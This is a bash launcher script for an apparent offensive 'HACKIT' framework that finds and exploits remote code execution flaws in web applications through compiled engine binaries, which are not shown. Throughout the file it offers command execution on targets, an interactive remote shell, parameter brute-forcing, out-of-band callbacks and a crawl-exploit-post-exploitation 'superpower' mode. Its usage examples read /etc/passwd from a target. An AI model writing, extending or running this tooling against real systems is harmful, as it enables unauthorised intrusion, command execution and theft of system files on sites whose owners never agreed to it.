#!/usr/bin/env bash
# RCE Module Launcher — HACKIT Framework v2.0
# Usage: ./rce.sh -u <target_url> [options]

DIR="$(cd "$(dirname "$0")" && pwd)"
source "$DIR/banner.sh"

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
B='\033[0;34m'; M='\033[0;35m'; C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'

usage() {
    banner
    echo -e "${Y}Usage:${N}"
    echo -e "  $0 -u <URL> [options]"
    echo -e ""
    echo -e "${C}Target:${N}"
    echo -e "  -u, --url <URL>        Target URL (with parameters)"
    echo -e "  -p, --param <param>    Specific parameter to test"
    echo -e "  -d, --data <body>      POST data body"
    echo -e "  -m, --method <method>  HTTP method (GET|POST) [default: GET]"
    echo -e ""
    echo -e "${C}Engine:${N}"
    echo -e "  -e, --engine <e>       Engine: go, rust, cpp, c, all [default: all]"
    echo -e ""
    echo -e "${C}Detection:${N}"
    echo -e "  --blind                Blind/time-based only"
    echo -e "  --oob <url>            OOB callback URL (e.g., http://collab.com)"
    echo -e "  --tech <type>          Target tech: php, asp, jsp, node, python"
    echo -e "  --all                  Test all common parameter names"
    echo -e ""
    echo -e "${C}Exploit:${N}"
    echo -e "  -c, --cmd <command>    Execute a command on target"
    echo -e "  --shell                Start interactive shell session"
    echo -e ""
    echo -e "${C}Request:${N}"
    echo -e "  -t, --timeout <n>      Request timeout in seconds [10]"
    echo -e "  -T, --threads <n>      Concurrent threads [20]"
    echo -e "  --proxy <url>          HTTP proxy"
    echo -e "  --cookie <data>        Cookie header"
    echo -e "  --ua <string>          User-Agent [Mozilla/5.0...]"
    echo -e "  --header <hdr>         Custom header (can repeat)"
    echo -e "  --delay <ms>           Delay between requests [0]"
    echo -e "  --retries <n>          Retry count per payload [1]"
    echo -e ""
    echo -e "${C}Discovery:${N}"
    echo -e "  --find                Discover & test all parameters from page for RCE"
    echo -e ""
    echo -e "${C}SuperPower:${N}"
    echo -e "  --super               SUPERPOWER MODE: crawl + detect + exploit + post-pwn"
    echo -e "  --depth <n>           Crawl depth for super mode [2]"
    echo -e "  --pages <n>           Max pages to crawl [30]"
    echo -e "  --no-post             Skip post-exploitation chain"
    echo -e ""
    echo -e "${C}Output:${N}"
    echo -e "  --json                 JSON output"
    echo -e "  -v, --verbose          Verbose output"
    echo -e "  --no-banner            Suppress banner"
    echo -e "  -h, --help             Show this help"
    echo -e ""
    echo -e "${M}Examples:${N}"
    echo -e "  $0 -u 'http://target.com/page?cmd=test'"
    echo -e "  $0 -u 'http://target.com/page' -p id -c 'cat /etc/passwd'"
    echo -e "  $0 -u 'http://target.com/page' --shell"
    echo -e "  $0 -u 'http://target.com/api' -d 'param=foo' -m POST --engine go"
    echo -e "  $0 --super -u 'http://target.com' --depth 3 --pages 50"
    echo -e "  $0 -u 'http://target.com' --oob 'http://burpcollab.net' --tech php"
    exit 0
}

URL=""; PARAM=""; DATA=""; METHOD="GET"; ENGINE=""; CMD=""
TIMEOUT=10; THREADS=20; PROXY=""; COOKIE=""; UA=""
OOB=""; TECH=""; HEADERS=(); DELAY=0; RETRIES=1
BLIND=false; JSON=false; VERBOSE=false; SHELL=false; NOBANNER=false; ALL=false
SUPER=false; FIND=false; DEPTH=2; PAGES=30; NOPOST=false

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u|--url) URL="$2"; shift 2 ;;
        -p|--param) PARAM="$2"; shift 2 ;;
        -d|--data) DATA="$2"; shift 2 ;;
        -m|--method) METHOD="$2"; shift 2 ;;
        -e|--engine) ENGINE="$2"; shift 2 ;;
        -c|--cmd) CMD="$2"; shift 2 ;;
        -t|--timeout) TIMEOUT="$2"; shift 2 ;;
        -T|--threads) THREADS="$2"; shift 2 ;;
        --proxy) PROXY="$2"; shift 2 ;;
        --cookie) COOKIE="$2"; shift 2 ;;
        --ua) UA="$2"; shift 2 ;;
        --oob) OOB="$2"; shift 2 ;;
        --tech) TECH="$2"; shift 2 ;;
        --header) HEADERS+=("$2"); shift 2 ;;
        --delay) DELAY="$2"; shift 2 ;;
        --retries) RETRIES="$2"; shift 2 ;;
        --find) FIND=true; shift ;;
        --super) SUPER=true; shift ;;
        --depth) DEPTH="$2"; shift 2 ;;
        --pages) PAGES="$2"; shift 2 ;;
        --no-post) NOPOST=true; shift ;;
        --shell) SHELL=true; shift ;;
        --blind) BLIND=true; shift ;;
        --all) ALL=true; shift ;;
        --json) JSON=true; shift ;;
        -v|--verbose) VERBOSE=true; shift ;;
        --no-banner) NOBANNER=true; shift ;;
        -h|--help) usage ;;
        *) echo -e "${R}Unknown option: $1${N}"; usage ;;
    esac
done

[[ -z "$URL" ]] && { echo -e "${R}[-] Target URL required (-u)${N}"; usage; }

$NOBANNER || banner

# ---- SUPERPOWER MODE ----
if [[ "$SUPER" == true ]]; then
    POST_FLAG=""
    $NOPOST && POST_FLAG="--no-post"
    VERB_FLAG=""
    $VERBOSE && VERB_FLAG="--verbose"
    BLIND_FLAG=""
    $BLIND && BLIND_FLAG="--blind"
    OOB_FLAG=""
    [[ -n "$OOB" ]] && OOB_FLAG="--oob $OOB"
    ENG_FLAG="${ENGINE:-go,rust,cpp,c}"

    echo -e "${R}[!] RCE SUPERPOWER MODE ACTIVATED${N}" >&2
    echo -e "${R}[!] Target: $URL | Depth: $DEPTH | Pages: $PAGES${N}" >&2
    python3 "$DIR/rce_super.py" -u "$URL" -e "$ENG_FLAG" --depth "$DEPTH" --pages "$PAGES" \
        --timeout "$TIMEOUT" $BLIND_FLAG $OOB_FLAG $POST_FLAG $VERB_FLAG 2>&1
    exit $?
fi

# ---- PARAMETER DISCOVERY MODE (--find) ----
if [[ "$FIND" == true ]]; then
    echo -e "${C}[*] Parameter discovery mode — scanning $URL${N}" >&2
    echo -e "${C}[*] Discovering parameters from page content + common names...${N}" >&2

    PARAM_LIST=$(TARGET_URL="$URL" TMOUT="${TIMEOUT:-10}" python3 << 'PYEOF' 2>&1
import urllib.request, urllib.parse, re, json, sys, os
url = os.environ.get('TARGET_URL', '')
timeout = int(os.environ.get('TMOUT', '10'))
try:
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
except: ctx = None
try:
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib.request.urlopen(req, timeout=timeout, context=ctx) if ctx else urllib.request.urlopen(req, timeout=timeout)
    html = resp.read().decode('utf-8', errors='ignore')
except Exception as e:
    print(json.dumps({'error': str(e)}))
    sys.exit(1)

params = set()
parsed = urllib.parse.urlparse(url)
for k in urllib.parse.parse_qs(parsed.query): params.add(k)
for m in re.finditer(r'<input[^>]*name="([^"]+)"', html, re.I): params.add(m.group(1))
for m in re.finditer(r'<select[^>]*name="([^"]+)"', html, re.I): params.add(m.group(1))
for m in re.finditer(r'<textarea[^>]*name="([^"]+)"', html, re.I): params.add(m.group(1))
for m in re.finditer(r'href="[^"]*\?([^"]+)"', html, re.I):
    for pair in m.group(1).split('&'):
        if '=' in pair: params.add(pair.split('=')[0].strip())
for d in ['q','id','cmd','exec','command','url','host','file','input','search',
    'c','code','lang','debug','action','process','run','system','shell',
    'page','dir','folder','path','cat','read','include','require','open',
    'doc','document','template','view','load','import','config','setting',
    'option','opt','key','token','pass','password','user','username','email']:
    params.add(d)
print(json.dumps(sorted(params)))
PYEOF
)

    if [[ $? -ne 0 ]]; then
        echo -e "${R}[-] Failed — using common RCE parameter names${N}" >&2
        PARAM_LIST='["q","id","cmd","exec","command","url","host","file","input","search","c","code","lang","debug","action","process","run","system","shell","page","dir","folder","path","cat","read","include","require","open","doc","document","template","view","load","import","config","setting","option","opt","key","token","pass","password","user","username","email"]'
    fi

    echo -e "${G}[+] Testing $(echo "$PARAM_LIST" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))") unique parameters${N}" >&2
    echo ""

    # Extract params into array
    mapfile -t PARAMS < <(echo "$PARAM_LIST" | python3 -c "import json,sys; [print(p) for p in json.load(sys.stdin)]")

    RESULTS_DIR="/tmp/hackit_find_$$"
    mkdir -p "$RESULTS_DIR"

    declare -A ENG_BINS
    ENG_BINS[go]="$DIR/go/bin/rce_engine"
    ENG_BINS[rust]="$DIR/rust/target/release/rce_engine"
    ENG_BINS[cpp]="$DIR/cpp/bin/rce_engine"
    ENG_BINS[c]="$DIR/c/bin/rce_engine"

    SELECTED=(go rust cpp c)
    TOTAL=$(( ${#PARAMS[@]} * ${#SELECTED[@]} ))
    COUNT=0

    for param in "${PARAMS[@]}"; do
        for eng in "${SELECTED[@]}"; do
            bin="${ENG_BINS[$eng]}"
            [[ ! -x "$bin" ]] && continue
            COUNT=$((COUNT + 1))
            echo -ne "\\r${C}[*] Testing parameter $param on $eng ($COUNT/$TOTAL)...${N}   " >&2
            args=("-u" "$URL" "-p" "$param" "--detect" "--json")
            [[ -n "$DATA" ]] && args+=("-d" "$DATA")
            [[ -n "$METHOD" ]] && args+=("-m" "$METHOD")
            [[ -n "$COOKIE" ]] && args+=("--cookie" "$COOKIE")
            [[ "$BLIND" == true ]] && args+=("--blind")
            timeout 30 "$bin" "${args[@]}" 2>/dev/null > "$RESULTS_DIR/${eng}_${param}.json" &
        done
        wait
    done
    echo ""

    # Collect and display results
    echo -e "\n${M}══════════════════════ PARAMETER DISCOVERY RESULTS ══════════════════════${N}" >&2
    echo -e "${C}Found ${#PARAMS[@]} parameters — detecting RCE potential...${N}" >&2
    echo ""

    ANY_VULN=false
    VULN_PARAMS=()
    for param in "${PARAMS[@]}"; do
        ENG_HITS=()
        for eng in "${SELECTED[@]}"; do
            f="$RESULTS_DIR/${eng}_${param}.json"
            [[ ! -f "$f" ]] && continue
            HIT=$(python3 -c "
import json
try:
    with open('$f') as fh: data = json.load(fh)
    if not isinstance(data, list): data = [data]
    for r in data:
        if r.get('vulnerable') and r.get('confidence',0) > 0:
            print(r.get('technique','?') + '|' + str(r.get('confidence',0)))
            break
except: pass
" 2>/dev/null)
            [[ -n "$HIT" ]] && ENG_HITS+=("$eng:$HIT")
        done
        if [[ ${#ENG_HITS[@]} -gt 0 ]]; then
            ANY_VULN=true
            VULN_PARAMS+=("$param")
            echo -e "  ${R}[!]${N} Param: ${Y}$param${N} — ${G}POTENTIAL RCE${N}"
            for hit in "${ENG_HITS[@]}"; do
                IFS=':' read -r e tech conf <<< "$hit"
                pct=$(python3 -c "print(f'{float($conf)*100:.0f}%')" 2>/dev/null)
                echo -e "       ${C}Engine: $e${N} | Tech: ${M}$tech${N} | Conf: ${G}$pct${N}"
            done
        else
            echo -e "  ${C}[-]${N} Param: ${Y}$param${N} — ${C}clean${N}"
        fi
    done

    echo ""
    if [[ "$ANY_VULN" == true ]]; then
        echo -e "${R}╔═══════════════════════════════════════════════════════════════════╗${N}" >&2
        echo -e "${R}║${W}  ⚠  ${#VULN_PARAMS[@]} parameter(s) show RCE potential — investigate manually  ${R}║${N}" >&2
        echo -e "${R}╚═══════════════════════════════════════════════════════════════════╝${N}" >&2
    else
        echo -e "${G}[✓] No parameters with RCE potential found${N}" >&2
    fi

    rm -rf "$RESULTS_DIR"
    exit 0
fi

declare -A ENG_BINS
ENG_BINS[go]="$DIR/go/bin/rce_engine"
ENG_BINS[rust]="$DIR/rust/target/release/rce_engine"
ENG_BINS[cpp]="$DIR/cpp/bin/rce_engine"
ENG_BINS[c]="$DIR/c/bin/rce_engine"

run_engine() {
    local name="$1" bin="$2"
    local args=()
    args+=("-u" "$URL")
    [[ -n "$PARAM" ]] && args+=("-p" "$PARAM")
    [[ -n "$DATA" ]] && args+=("-d" "$DATA")
    [[ -n "$METHOD" ]] && args+=("-m" "$METHOD")
    [[ -n "$PROXY" ]] && args+=("--proxy" "$PROXY")
    [[ -n "$COOKIE" ]] && args+=("--cookie" "$COOKIE")
    [[ -n "$UA" ]] && args+=("--ua" "$UA")
    [[ -n "$OOB" ]] && args+=("--oob" "$OOB")
    [[ -n "$TECH" ]] && args+=("--tech" "$TECH")
    args+=("--timeout" "$TIMEOUT")
    args+=("-t" "$THREADS")
    [[ "$DELAY" -gt 0 ]] && args+=("--delay" "$DELAY")
    [[ "$RETRIES" -gt 1 ]] && args+=("--retries" "$RETRIES")
    for hdr in "${HEADERS[@]}"; do args+=("--header" "$hdr"); done
    args+=("--json")
    $BLIND && args+=("--blind")
    $ALL && args+=("--all")
    $VERBOSE && args+=("--verbose")

    if [[ -n "$CMD" || "$SHELL" == true ]]; then
        if [[ "$SHELL" == true ]]; then args+=("--shell")
        else args+=("--exploit" "-c" "$CMD"); fi
    else args+=("--detect"); fi

    case $name in
        go)   phase="Phase 1" ;;
        rust) phase="Phase 2" ;;
        cpp)  phase="Phase 3" ;;
        c)    phase="Phase 4" ;;
    esac
    echo -e "${C}[*] Running $phase engine...${N}" >&2
    "$bin" "${args[@]}" 2>/dev/null
}

RESULTS_DIR="/tmp/hackit_rce_$$"
mkdir -p "$RESULTS_DIR"

if [[ -n "$ENGINE" && "$ENGINE" != "all" ]]; then SELECTED=("$ENGINE")
else SELECTED=(go rust cpp c); fi

ENG_NAMES=()
for eng in "${SELECTED[@]}"; do
    bin="${ENG_BINS[$eng]}"
    [[ -z "$bin" ]] && { echo -e "${Y}Unknown engine: $eng${N}" >&2; continue; }
    [[ ! -x "$bin" ]] && { echo -e "${Y}[!] $eng binary not found, skipping${N}" >&2; continue; }
    run_engine "$eng" "$bin" > "$RESULTS_DIR/$eng.json" &
    ENG_NAMES+=("$eng")
done

wait

echo -e "\n${M}══════════════════════ RCE RESULTS ══════════════════════${N}" >&2

for eng in "${ENG_NAMES[@]}"; do
    local_file="$RESULTS_DIR/$eng.json"
    [[ ! -f "$local_file" ]] && continue
    python3 -c "
import sys, json
try:
    with open('$local_file') as f:
        data = json.load(f)
    if not isinstance(data, list): data = [data]
    for r in data:
        if isinstance(r, dict) and r.get('vulnerable'):
            print('{}|{}|{}|{}'.format('$eng', r.get('parameter','?'), r.get('technique','?'), r.get('confidence',0)))
except: pass
" 2>/dev/null | while IFS='|' read -r eng param tech conf; do
        pct=$(python3 -c "print(f'{float($conf)*100:.0f}%')" 2>/dev/null)
        echo -e "  ${R}[!]${N} Engine: ${C}$eng${N} | Param: ${Y}$param${N} | Tech: ${M}$tech${N} | Conf: ${G}$pct${N}" >&2
    done
done

vuln_count=0
for eng in "${ENG_NAMES[@]}"; do
    f="$RESULTS_DIR/$eng.json"
    [[ -f "$f" ]] && vuln_count=$((vuln_count + $(python3 -c "
import json; d=json.load(open('$f')); print(sum(1 for r in (d if isinstance(d,list) else [d]) if r.get('vulnerable')))" 2>/dev/null || echo 0)))
done

if [[ "$vuln_count" -gt 0 ]]; then
    echo -e "\n${R}╔══════════════════════════════════════════════════════╗${N}" >&2
    echo -e "${R}║${W}           ⚠  RCE VULNERABILITY DETECTED  ⚠          ${R}║${N}" >&2
    echo -e "${R}╚══════════════════════════════════════════════════════╝${N}" >&2
    echo -e "${R}[!] RCE CONFIRMED — $vuln_count vulnerability(ies) found${N}" >&2
else
    echo -e "${G}[✓] No RCE vulnerabilities detected across ${#ENG_NAMES[@]} engine(s)${N}" >&2
fi

if [[ "$JSON" == true ]]; then
    python3 -c "
import json, os
all_results = []
for f in os.listdir('$RESULTS_DIR'):
    if f.endswith('.json'):
        with open(os.path.join('$RESULTS_DIR', f)) as fh:
            try:
                data = json.load(fh)
                if isinstance(data, list): all_results.extend(data)
                else: all_results.append(data)
            except: pass
print(json.dumps(all_results, indent=2))
" 2>/dev/null
fi

rm -rf "$RESULTS_DIR"
